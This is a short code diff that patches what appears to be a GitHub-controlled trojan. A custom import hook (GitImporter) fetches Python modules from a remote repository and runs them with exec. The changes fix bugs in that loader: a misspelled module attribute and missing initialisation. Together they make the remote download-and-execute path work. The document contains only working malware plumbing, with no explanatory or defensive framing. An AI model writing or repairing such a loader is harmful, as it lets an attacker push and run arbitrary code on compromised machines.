@@ -6,6 +6,8 @@ import random
 import sys
 import threading
 import time
+import importlib.util
+import importlib.abc
 
 from datetime import datetime
 def github_connect():
@@ -56,6 +58,8 @@ class GitImporter(importlib.abc.MetaPathFinder, importlib.abc.Loader):
         self._module_codes = {}
 
     def find_spec(self, name, path, target=None):
+        if not hasattr(self, '_module_codes'):
+            self._module_codes = {}
         print(f"[*] Attempting to retrieve {name}")
         repo = github_connect()
         new_library = get_file_contents('modules', f'{name}.py', repo)
@@ -68,7 +72,7 @@ class GitImporter(importlib.abc.MetaPathFinder, importlib.abc.Loader):
         return None
 
     def exec_module(self, module):
-        code = self._module_codes.get(module.name_, b"")
+        code = self._module_codes.get(module.__name__, b"")
         exec(compile(code, f'<github:{module.__name__}>', 'exec'), module.__dict__)
 
 if __name__ == '__main__':
